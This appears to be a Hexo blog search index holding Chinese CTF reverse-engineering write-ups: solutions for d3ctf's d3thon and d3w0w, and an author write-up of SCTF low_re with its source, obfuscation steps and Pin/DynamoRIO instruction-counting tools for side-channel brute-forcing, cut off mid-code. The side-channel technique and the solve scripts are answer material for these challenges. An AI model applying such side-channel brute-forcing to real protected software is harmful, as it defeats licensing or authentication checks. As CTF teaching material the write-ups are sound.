<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>d3ctf</title>
      <link href="/2022/03/15/d3ctf/"/>
      <url>/2022/03/15/d3ctf/</url>
      
        <content type="html"><![CDATA[<p>这次写了两道的wp, 第一道u3d的游戏队友出得比我快, 就没写了.</p><span id="more"></span><h2 id="d3thon"><a href="#d3thon" class="headerlink" title="d3thon"></a>d3thon</h2><p>打开一看发现是python导入pyd一类的东西, 用python3.10可以跑起来.</p><p>lbc包含了指令的逻辑, byte_analizer.so是类似解释器的东西, pyd的逆向非常困难, 所以我直接通过输入输出来猜测lbc文件中的逻辑. (byte_ananlizer有成员Variables来获得变量值</p><p>结果如下</p><pre class="line-numbers language-none"><code class="language-none">kZslMZYnvPBwgdCz   printoGwDokoxZgoeViFcAF 赋值(如果赋值为KezJKhCxGRZnfLCGT, 则为输入RDDDZUiIKbxCubJEN  jmptodeVDuRkYSIITaT   转为2进制uPapnsSbmeJLjin    转为10进制kuhisCvwaXWfqCs    -flag - 1IEKMEDdrPpzpdKy    addOcKUQCYqhwHXfAgGZH  xorFLNPsiCIvICFtzpUAR subOuGFUKNGxNLeHOudCK cmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>lbc中加密的逻辑为</p><p>把非01的字符转为ord值, 再转为2进制, 2进制字符串串联起来, 转为10进制, 最后进行运算</p><p>解题脚本:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">#a是那一堆很复杂的运算k = {}for i in range(2,10):    k[str(i)] = "{0:b}".format(ord(str(i))).zfill(8)for i in range(97, 123):    k[chr(i)]="{0:b}".format(i).zfill(8)b = -194952731925593882593246917508862867371733438849523064153861650948471779982880938i = len(a) - 1while i &gt;= 0:    if (a[i - 1] == "xor"):         b ^= int(a[i])        i -= 2    elif (a[i - 1] == "add"):        b -= int(a[i])        i -= 2    elif (a[i - 1] == "sub"):        b += int(a[i])        i -= 2    elif (a[i] == "????????:flag"):  #-flag - 1的运算        b = -b - 1        i -= 1    else :        print("error")    c = bin(b)[2:]s = ""i = len(c)while i &gt;= 8:    for key, value in k.items():        if (c[i - 8:i] == k[key]):            s = key + s            i -= 8            breakprint(s)print(i)#1101000011011100110010001110010110000100110100011000010011011001100010011000100110010001100100001101000110010000110111001110000110001100111001001101000110010100110#11000110010001100100011100100110010001101010011011101100001011001100011001100110101 01100101#4729a4a6bbdd4d78c94e6229257af35e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="d3w0w"><a href="#d3w0w" class="headerlink" title="d3w0w"></a><strong>d3w0w</strong></h2><p>这个题目感觉是一个迷宫题, 要求迷宫得玩家打造那种, 并且给出了迷宫的要求</p><p>对输入的转化(输入只能由39位, 减去前缀, 只有32位)</p><pre class="line-numbers language-none"><code class="language-none">case '1':        *(_DWORD *)(a2 + 24 * v5 + 4 * v4) |= 8u;// 上        *(_DWORD *)(a2 + 24 * --v5 + 4 * v4) |= 2u;        goto LABEL_14;      case '2':        *(_DWORD *)(a2 + 24 * v5 + 4 * v4) |= 2u;// 下        *(_DWORD *)(a2 + 24 * ++v5 + 4 * v4) |= 8u;        goto LABEL_14;      case '3':        *(_DWORD *)(a2 + 24 * v5 + 4 * v4) |= 4u;// 左        *(_DWORD *)(a2 + 24 * v5 + 4 * v4-- - 4) |= 1u;        goto LABEL_14;      case '4':        *(_DWORD *)(a2 + 24 * v5 + 4 * v4) |= 1u;// 右        *(_DWORD *)(a2 + 24 * v5 + 4 * v4++ + 4) |= 4u;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入转化的值,只看低4位:</p><p>第4位表示能往上走, 第3位表示能向左走, 第2位表示能向下走, 第1位表示能向右走, 设置迷宫时只能一步步顺序设置.</p><p>迷宫校验为64位模式进行校验, 所以得从64位的角度进行反编译</p><pre class="line-numbers language-none"><code class="language-none">for ( i = 0; i &lt; 6; ++i )  {    for ( j = 0; j &lt; 6; ++j )    {      if ( (unsigned int)retaddr[6 * i + j] &gt; 0xF )        return 1i64;      v16 = retaddr[6 * i + j] % 0x10u / 8;      v24 = j;      v17 = retaddr[6 * i + j] % 8u / 4 + v16;      v25 = j;      v18 = retaddr[6 * i + j] % 4u / 2 + v17;      v26 = j;      if ( retaddr[6 * i + j] % 2u + v18 &gt; 2 )  //每个点的通道不能超过两个        return 1i64;//检验边界      if ( !j &amp;&amp; retaddr[6 * i] % 8u / 4 )        return 1i64;      if ( j == 5 &amp;&amp; retaddr[6 * i + 5] % 2u )        return 1i64;      if ( !i &amp;&amp; retaddr[j] % 0x10u / 8 )        return 1i64;      if ( i == 5 &amp;&amp; retaddr[j + 30] % 4u / 2 )        return 1i64;    }  }//特殊点1for ( k = 0; (unsigned __int64)k &lt; 3; ++k )  {    v4 = v22[k] / 10;    v7 = v22[k] % 10;//结合下面的条件, 方向必须垂直    if ( retaddr[6 * v4 + v7] % 0x10u / 8 &amp;&amp; retaddr[6 * v4 + v7] % 4u / 2 )       return 1i64;    if ( retaddr[6 * v4 + v7] % 8u / 4 &amp;&amp; retaddr[6 * v4 + v7] % 2u )      return 1i64;    v19 = retaddr[6 * v4 + v7] % 0x10u / 8;    v27 = v7;    v20 = retaddr[6 * v4 + v7] % 4u / 2 + v19;    v28 = v7;    v21 = retaddr[6 * v4 + v7] % 2u + v20;    v29 = v7;    if ( retaddr[6 * v4 + v7] % 8u / 4 + v21 != 2 )  //必须有两个通道      return 1i64;//此节点通向的第一个点和该点有相同方向通道(该节点通向的第一个节点的方向)    if ( retaddr[6 * v4 + v7] % 0x10u / 8 )     {      if ( !(retaddr[6 * v4 - 6 + v7] % 0x10u / 8) )        return 1i64;    }    else if ( retaddr[6 * v4 + v7] % 4u / 2 )    {      if ( !(retaddr[6 * v4 + 6 + v7] % 4u / 2) )        return 1i64;    }    else if ( retaddr[6 * v4 + v7] % 8u / 4 )    {      if ( !(retaddr[6 * v4 - 1 + v7] % 8u / 4) )        return 1i64;    }    else if ( retaddr[6 * v4 + v7] % 2u &amp;&amp; !(retaddr[6 * v4 + 1 + v7] % 2u) )    {      return 1i64;    }  }//特殊点二2for ( m = 0; (unsigned __int64)m &lt; 0xA; ++m )  {    v5 = v23[m] / 10;    v8 = v23[m] % 10;//方向必须平行    if ( (!(retaddr[6 * v5 + v8] % 0x10u / 8) || !(retaddr[6 * v5 + v8] % 4u / 2))      &amp;&amp; (!(retaddr[6 * v5 + v8] % 8u / 4) || !(retaddr[6 * v5 + v8] % 2u)) )    {      return 1i64;    }//必须有通道垂直该节点的方向    if ( retaddr[6 * v5 + v8] % 0x10u / 8      &amp;&amp; retaddr[6 * v5 + v8] % 4u / 2      &amp;&amp; !(retaddr[6 * v5 - 6 + v8] % 8u / 4)      &amp;&amp; !(retaddr[6 * v5 - 6 + v8] % 2u)      &amp;&amp; !(retaddr[6 * v5 + 6 + v8] % 8u / 4)      &amp;&amp; !(retaddr[6 * v5 + 6 + v8] % 2u) )    {      return 1i64;    }    if ( retaddr[6 * v5 + v8] % 8u / 4      &amp;&amp; retaddr[6 * v5 + v8] % 2u      &amp;&amp; !(retaddr[6 * v5 + 1 + v8] % 0x10u / 8)      &amp;&amp; !(retaddr[6 * v5 + 1 + v8] % 4u / 2)      &amp;&amp; !(retaddr[6 * v5 - 1 + v8] % 0x10u / 8)      &amp;&amp; !(retaddr[6 * v5 - 1 + v8] % 4u / 2) )    {      return 1i64;    }  }//上下左右的顺序寻路, 不能返回上个节点, 要求回到原点if ( *retaddr % 0x10u / 8 )  {    v6 = -1;    do    {LABEL_79:      if ( !(retaddr[6 * v6 + v9] % 0x10u / 8) || v6 - 1 == v12 &amp;&amp; v9 == v13 )      {        if ( !(retaddr[6 * v6 + v9] % 4u / 2) || v6 + 1 == v12 &amp;&amp; v9 == v13 )        {          if ( !(retaddr[6 * v6 + v9] % 8u / 4) || v6 == v12 &amp;&amp; v9 - 1 == v13 )          {            if ( !(retaddr[6 * v6 + v9] % 2u) || v6 == v12 &amp;&amp; v9 + 1 == v13 )//走到死胡同              return 1i64;            v12 = v6;            v13 = v9++;          }          else          {            v12 = v6;            v13 = v9--;          }        }        else        {          v12 = v6;          v13 = v9;          ++v6;        }      }      else      {        v12 = v6;        v13 = v9;        --v6;      }    }    while ( v6 || v9 );    return 0i64;  }  else  {    if ( *retaddr % 4u / 2 )    {      v6 = 1;      goto LABEL_79;    }    if ( *retaddr % 8u / 4 )    {      v9 = -1;      goto LABEL_79;    }    if ( *retaddr % 2u )    {      v9 = 1;      goto LABEL_79;    }    return 1i64;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后画图</p><p><img src="/2022/03/15/d3ctf/Untitled.png" alt="Untitled"></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF low_re</title>
      <link href="/2022/01/04/SCTF-low-re/"/>
      <url>/2022/01/04/SCTF-low-re/</url>
      
        <content type="html"><![CDATA[<h2 id="SCTF-low-re"><a href="#SCTF-low-re" class="headerlink" title="SCTF low_re"></a>SCTF low_re</h2><p>这个题其实算是逆向题, 考虑到这个题不是常规逆向思路, 并且有点谜语, 所以我把这个题放misc里面了.  </p><span id="more"></span><p>出题人比较菜, 如果给师傅们造成了不好的体验, 轻点骂, orz.</p><p>这个题目的预期解是通过pintool之类的插桩工具进行指令计数来进行爆破, 但是我也看到有一些师傅使用钩子来获得信息的一些思路, 甚至于做了一些vmp的逆向, 师傅们tql. </p><h3 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h3><h4 id="首先python源代码"><a href="#首先python源代码" class="headerlink" title="首先python源代码"></a>首先python源代码</h4><p>这里是单字节加密(所以可以使用侧信道爆破)</p><pre class="line-numbers language-none"><code class="language-none">import hashlibimport sysdef _rc4_crypt(key, data, dataLen):    out = []    s_box = list(range(256))    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    for x in range(dataLen):        i = (i + 1) % 256        j = (j + s_box[i]) % 256        t = s_box[i]        s_box[i] = s_box[j]        s_box[j] = t        ti = (s_box[i] + (s_box[j] % 256)) % 256        t = s_box[ti]        while (len(out) &lt; x + 1):            out.append(0)        out[x] = data[x] ^ t    return outdef linux_srand(seed):    if seed == 0:        seed = 1    word = seed    seed = seed &amp; 0xffffffff    global linux_status    global linux_r    linux_status = 0    linux_r = [0] * (344 + linux_status)    linux_r[0] = seed    for i in range(1, 31):        if (word &lt; 0):            hi = (-word) // 127773            hi = -hi            lo = (-word) % 127773            lo = -lo        else:            hi = word // 127773            lo = word % 127773        word = ((16807 * lo)) - ((2836 * hi))        if word &lt; 0:            word = (2147483647 + word) &amp; 0xffffffff        linux_r[i] = word    for i in range(31, 34):        linux_r[i] = linux_r[i - 31]    for i in range(34, 344):        linux_r[i] = (((linux_r[i - 31] + linux_r[i - 3]) &amp; 0xffffffff) % (1 &lt;&lt; 32)) &amp; 0xffffffffdef linux_rand():    global linux_status    global linux_r    linux_r.append(0)    linux_r[344 + linux_status] = (((linux_r[344 + linux_status - 31] + linux_r[344 + linux_status - 3]) &amp; 0xffffffff) % (1 &lt;&lt; 32)) &amp; 0xffffffff    linux_status += 1    return linux_r[344 + linux_status - 1] &gt;&gt; 1print("hello challanger")flag = input("please input your flag:\n")if (type(flag) != str):    print("error")    sys.exit()if (len(flag) != 17):    sys.exit()flag = list(bytes(flag, encoding='utf-8'))flag = _rc4_crypt('Sycl0ver', flag, len(flag))for i in range(len(flag)):    linux_srand(flag[i])    flag[i] = str(linux_rand())ciphertext=['ee197bbac1b0e09c425e1dfd30cea2506bd493a674c4de90d9afbe5abc700b06','1a6aafb16a23ffde40c426d5c87f5afcc77fffc96cf041dc8dd2c47e706a7ecb','62c62ce7768a4836b10495317a32da6e3943d522bc3b9797ff0a44931e966a31','e6222354b50e4d33d73314b515b325633e57a105758e20aca23eb2dadd625f3f','78f92a6ad9ffcec47f30e3ca3d18065bdba9c020ff5f477b801d11efdfaa9cd0','127291de1f4cbbb35c41556a3c6d5a64f08661bc7ed394ea6210354e6218ad93','62c62ce7768a4836b10495317a32da6e3943d522bc3b9797ff0a44931e966a31','52080868c07a9ef5646b5f0b198f04f013cf23cfbfb06123d8f2fdd63d359123','f69b52599973fc5915ad1d435236863252dc3fd460989bd9f56ffc199ef8ff36','e9552f8c3e518306524fa9c9728ad6dee88fa611aa3068c169217f173964f9b4','54cb43f463ea082699131b71d45fb0384f8c2f598e8f0072b960b4add731e048','97e45e15c74f71ea59ffffb40298f2e5dec119c2205e434e3a0d2510c331037f','51b7d78cfe25ede262fd85a65b24721f076ab9dd6562403878ca5cde1ebf3219','a1cd6c7990abb6b271695381d78898ec5c4880fbc0f6a0c9fda064422f21361e','85ddd3721d173367465373f75e190bd937a8dc3588d5d82ebff8104dec88ac3e','d6eeac4ea40f9513391ef0bf72aa2fd2588889cb9d5f4cc638ce4d2c5509527b','5023939dca9273fd767d5e4ea329846f9816af461e170b6db8d20b6e5ff3de8c']for i in range(len(flag)):    for j in range(2560):        s = hashlib.sha256()        s.update(bytes(flag[i], encoding='utf-8'))        flag[i] = s.hexdigest()    #print("'" + flag[i]+ "',")    if (flag[i] != ciphertext[i]):        sys.exit()print("you are right")sys.exit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="混淆python"><a href="#混淆python" class="headerlink" title="混淆python"></a>混淆python</h4><p>使用python pyminifier的混淆功能去混淆python代码</p><p>虽然有一种乱码混淆, 但是可能会导致这样那样的问题, 我就没有使用了</p><pre class="line-numbers language-none"><code class="language-none">pyminifier --obfuscate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 混淆出来之后可能点错误, 手动改改就ok了.</p><h4 id="转化为C代码并且编译"><a href="#转化为C代码并且编译" class="headerlink" title="转化为C代码并且编译"></a>转化为C代码并且编译</h4><p>在文件的开头记得加上python3的声明 不然会转化失败</p><pre class="line-numbers language-none"><code class="language-none"># cython: language_level=3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网上python的一个GCC编译exe的脚本</p><pre class="line-numbers language-none"><code class="language-none">import subprocessimport sysimport tempfilefrom Cython.Compiler import Main, CmdLine, Optionsin_file_name = sys.argv[1]source = open(in_file_name).read()out_file_name = in_file_name.replace('.py', '.exe')temp_py_file = tempfile.NamedTemporaryFile(suffix='.py', delete=False)temp_py_file.write(source.encode())temp_py_file.flush()Main.Options.embed = 'main'res = Main.compile_single(temp_py_file.name, Main.CompilationOptions(), '')gcc_cmd = 'gcc -static -municode -DMS_WIN64 -fPIC -O2 %s -Id:\\Python\\Python38\\include -Ld:\\Python\\Python38\\libs -lpython38 -o %s' % (res.c_file, out_file_name)print(gcc_cmd)assert 0 == subprocess.check_call(gcc_cmd.split(' '))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的unicode是因为winmain, 如果不用unicode会报错.</p><p>这样就生成了exe</p><h4 id="vmp加壳"><a href="#vmp加壳" class="headerlink" title="vmp加壳"></a>vmp加壳</h4><p>网上找一个”学习”版的加壳软件, 关闭内存保护, 这样就可以进行插桩了.</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="侧信道爆破工具构建"><a href="#侧信道爆破工具构建" class="headerlink" title="侧信道爆破工具构建"></a>侧信道爆破工具构建</h4><p>师傅们基本上都是用的官方给的代码来构建, 但是pin官方给的指令计数是算了库的, 这样的话计算出来的指令正常波动就会非常大, 所以我使用了2560次的hash加密, 希望能够使得正确答案的指令大小更为明显, 但是我自己爆破的时候, 如果从头开始爆破, 在得到最后几个字符的时候可能会发生错误. 在和小组另外一个师傅的交流之后, 发现如果不计算库的时候指令波动会非常小.</p><h5 id="pin"><a href="#pin" class="headerlink" title="pin"></a>pin</h5><p>下载地址<a href="https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-binary-instrumentation-tool-downloads.html">https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-binary-instrumentation-tool-downloads.html</a></p><p>pin工具可以实现不算库的爆破, 但是官方好像没有给不计算库的指令的代码, 需要自己去写判断, 这里我做的限制条件是 exe的首地址 &lt;= 需要计数指令的地址 &lt;= exe的结束地址.</p><p>source/MyPinTool/MyPinTool.cpp: (用VS打开.vcxproj后缀文件就可以进行写代码了)</p><pre class="line-numbers language-none"><code class="language-none">/* * Copyright 2002-2020 Intel Corporation. * * This software is provided to you as Sample Source Code as defined in the accompanying * End User License Agreement for the Intel(R) Software Development Products ("Agreement") * section 1.L. * * This software and the related documents are provided as is, with no express or implied * warranties, other than those that are expressly stated in the License. */ /*! @file  *  This file contains an ISA-portable PIN tool for counting dynamic instructions  */#include "pin.H"#include &lt;iostream&gt;using std::cerr;using std::endl;/* ===================================================================== *//* Global Variables *//* ===================================================================== */UINT64 ins_count = 0;bool runing = false;UINT64 exe_start;UINT64 exe_size;/* ===================================================================== *//* Commandline Switches *//* ===================================================================== *//* ===================================================================== *//* Print Help Message                                                    *//* ===================================================================== */INT32 Usage(){    cerr &lt;&lt; "This tool prints out the number of dynamic instructions executed to stderr.\n"        "\n";    cerr &lt;&lt; KNOB_BASE::StringKnobSummary();    cerr &lt;&lt; endl;    return -1;}/* ===================================================================== */VOID docount() { ins_count++; } /* ===================================================================== */VOID Instruction(INS ins, VOID* v) {     ADDRINT addr = INS_Address(ins);    if (exe_start &lt;= addr &amp;&amp; addr &lt;= exe_start + exe_size) //判断指令是否在库中, 若不在, 则进行插桩        INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END); }VOID Image(IMG img, VOID* v){    if (IMG_IsMainExecutable(img))    {        exe_start = IMG_StartAddress(img);        exe_size = IMG_SizeMapped(img);    }}/* ===================================================================== */VOID Fini(INT32 code, VOID* v) {     cerr &lt;&lt; "Count " &lt;&lt; ins_count &lt;&lt; " " &lt;&lt; exe_start &lt;&lt; " " &lt;&lt; exe_size + exe_start &lt;&lt; endl;}/* ===================================================================== *//* Main                                                                  *//* ===================================================================== */int main(int argc, char* argv[]){    if (PIN_Init(argc, argv))    {        return Usage();    }    IMG_AddInstrumentFunction(Image, 0);    INS_AddInstrumentFunction(Instruction, 0);    PIN_AddFiniFunction(Fini, 0);    // Never returns    PIN_StartProgram();    return 0;}/* ===================================================================== *//* eof *//* ===================================================================== */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="dynamorio"><a href="#dynamorio" class="headerlink" title="dynamorio"></a>dynamorio</h5><p>另外一款插桩工具dynamorio.这款工具的爆破其实比pin工具更快, 但是inscount.cpp的指令输出是消息框, 需要自己做一些改动.</p><p>这款工具的官方给的代码是有不计算库的选项的.</p><p>build官方文档:<a href="https://dynamorio.org/page_building.html">https://dynamorio.org/page_building.html</a></p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/DynamoRIO/dynamorio.gitcd dynamorio &amp;&amp; mkdir build &amp;&amp; cd buildcmake -G"Visual Studio 15" .. #从这里指定你的VS版本, 2019为16, 2022为17 后面跟上dynamorio的源路径cmake --build . --config RelWithDebInfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来直接打开build/api/samples/DynamoRIO_samples.sln就可以进行写代码编译了</p><p>修改后的inscount.cpp:</p><pre class="line-numbers language-none"><code class="language-none">/* ****************************************************************************** * Copyright (c) 2014-2018 Google, Inc.  All rights reserved. * Copyright (c) 2011 Massachusetts Institute of Technology  All rights reserved. * Copyright (c) 2008 VMware, Inc.  All rights reserved. * ******************************************************************************//* * Redistribution and use in source and binary forms, with or without * modification, are permitted provided that the following conditions are met: * * * Redistributions of source code must retain the above copyright notice, *   this list of conditions and the following disclaimer. * * * Redistributions in binary form must reproduce the above copyright notice, *   this list of conditions and the following disclaimer in the documentation *   and/or other materials provided with the distribution. * * * Neither the name of VMware, Inc. nor the names of its contributors may be *   used to endorse or promote products derived from this software without *   specific prior written permission. * * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE * ARE DISCLAIMED. IN NO EVENT SHALL VMWARE, INC. OR CONTRIBUTORS BE LIABLE * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH * DAMAGE. *//* Code Manipulation API Sample: * inscount.cpp * * Reports the dynamic count of the total number of instructions executed. * Illustrates how to perform performant clean calls. * Demonstrates effect of clean call optimization and auto-inlining with * different -opt_cleancall values. * * The runtime options for this client include: *   -only_from_app  Do not count instructions in shared libraries. * The options are handled using the droption extension. */#include "dr_api.h"#include "drmgr.h"#include "droption.h"#include &lt;string.h&gt;#include&lt;iostream&gt;#ifdef WINDOWS#    define DISPLAY_STRING(msg) dr_messagebox(msg)#else#    define DISPLAY_STRING(msg) dr_printf("%s\n", msg);#endif#define NULL_TERMINATE(buf) (buf)[(sizeof((buf)) / sizeof((buf)[0])) - 1] = '\0'static droption_t&lt;bool&gt; only_from_app(    DROPTION_SCOPE_CLIENT, "only_from_app", false,    "Only count app, not lib, instructions",    "Count only instructions in the application itself, ignoring instructions in "    "shared libraries."); //把选项加上only_from_app就可以不进行库的计数/* Application module */static app_pc exe_start;/* we only have a global count */static uint64 global_count;/* A simple clean call that will be automatically inlined because it has only * one argument and contains no calls to other functions. */static voidinscount(uint num_instrs){    global_count += num_instrs;}static voidevent_exit(void);static dr_emit_flags_tevent_bb_analysis(void *drcontext, void *tag, instrlist_t *bb, bool for_trace,                  bool translating, void **user_data);static dr_emit_flags_tevent_app_instruction(void *drcontext, void *tag, instrlist_t *bb, instr_t *inst,                      bool for_trace, bool translating, void *user_data);DR_EXPORT voiddr_client_main(client_id_t id, int argc, const char *argv[]){    dr_set_client_name("DynamoRIO Sample Client 'inscount'",                       "http://dynamorio.org/issues");    /* Options */    if (!droption_parser_t::parse_argv(DROPTION_SCOPE_CLIENT, argc, argv, NULL, NULL))        DR_ASSERT(false);    drmgr_init();    /* Get main module address */    if (only_from_app.get_value()) {        module_data_t *exe = dr_get_main_module();        if (exe != NULL)            exe_start = exe-&gt;start;        dr_free_module_data(exe);    }    /* register events */    dr_register_exit_event(event_exit);    drmgr_register_bb_instrumentation_event(event_bb_analysis, event_app_instruction,                                            NULL);    /* make it easy to tell, by looking at log file, which client executed */    dr_log(NULL, DR_LOG_ALL, 1, "Client 'inscount' initializing\n");#ifdef SHOW_RESULTS    /* also give notification to stderr */    if (dr_is_notify_on()) {#    ifdef WINDOWS        /* ask for best-effort printing to cmd window.  must be called at init. */        dr_enable_console_printing();#    endif        dr_fprintf(STDERR, "Client inscount is running\n");    }#endif}static voidevent_exit(void){#ifdef SHOW_RESULTS    char msg[512];    int len;    len = dr_snprintf(msg, sizeof(msg) / sizeof(msg[0]),                      "Instrumentation results: %llu instructions executed\n",                      global_count);    DR_ASSERT(len &gt; 0);    NULL_TERMINATE(msg);    //DISPLAY_STRING(msg);   //这里是messagebox 把这个数据时间控制台输出就行了    std::cout &lt;&lt; msg &lt;&lt; std::endl;#endif /* SHOW_RESULTS */    drmgr_exit();}static dr_emit_flags_tevent_bb_analysis(void *drcontext, void *tag, instrlist_t *bb, bool for_trace,                  bool translating, void **user_data){    instr_t *instr;    uint num_instrs;#ifdef VERBOSE    dr_printf("in dynamorio_basic_block(tag=" PFX ")\n", tag);#    ifdef VERBOSE_VERBOSE    instrlist_disassemble(drcontext, tag, bb, STDOUT);#    endif#endif    /* Only count in app BBs */    if (only_from_app.get_value()) {        module_data_t *mod = dr_lookup_module(dr_fragment_app_pc(tag));        if (mod != NULL) {            bool from_exe = (mod-&gt;start == exe_start);            dr_free_module_data(mod);            if (!from_exe) {                *user_data = NULL;                return DR_EMIT_DEFAULT;            }        }    }    /* Count instructions. If an emulation client is running with this client,     * we want to count all the original native instructions and the emulated     * instruction but NOT the introduced native instructions used for emulation.     */    bool is_emulation = false;    for (instr = instrlist_first(bb), num_instrs = 0; instr != NULL;         instr = instr_get_next(instr)) {        if (drmgr_is_emulation_start(instr)) {            /* Each emulated instruction is replaced by a series of native             * instructions delimited by labels indicating when the emulation             * sequence begins and ends. It is the responsibility of the             * emulation client to place the start/stop labels correctly.             */            num_instrs++;            is_emulation = true;            /* Data about the emulated instruction can be extracted from the             * start label using the accessor function:             * drmgr_get_emulated_instr_data()             */            continue;        }        if (drmgr_is_emulation_end(instr)) {            is_emulation = false;            continue;        }        if (is_emulation)            continue;        if (!instr_is_app(instr))            continue;        num_instrs++;    }    *user_data = (void *)(ptr_uint_t)num_instrs;#if defined(VERBOSE) &amp;&amp; defined(VERBOSE_VERBOSE)    dr_printf("Finished counting for dynamorio_basic_block(tag=" PFX ")\n", tag);    instrlist_disassemble(drcontext, tag, bb, STDOUT);#endif    return DR_EMIT_DEFAULT;}static dr_emit_flags_tevent_app_instruction(void *drcontext, void *tag, instrlist_t *bb, instr_t *instr,                      bool for_trace, bool translating, void *user_data){    uint num_instrs;    /* By default drmgr enables auto-predication, which predicates all instructions with     * the predicate of the current instruction on ARM.     * We disable it here because we want to unconditionally execute the following     * instrumentation.     */    drmgr_disable_auto_predication(drcontext, bb);    if (!drmgr_is_first_instr(drcontext, instr))        return DR_EMIT_DEFAULT;    /* Only insert calls for in-app BBs */    if (user_data == NULL)        return DR_EMIT_DEFAULT;    /* Insert clean call */    num_instrs = (uint)(ptr_uint_t)user_data;    dr_insert_clean_call(drcontext, bb, instrlist_first_app(bb), (void *)inscount,                         false /* save fpstate */, 1, 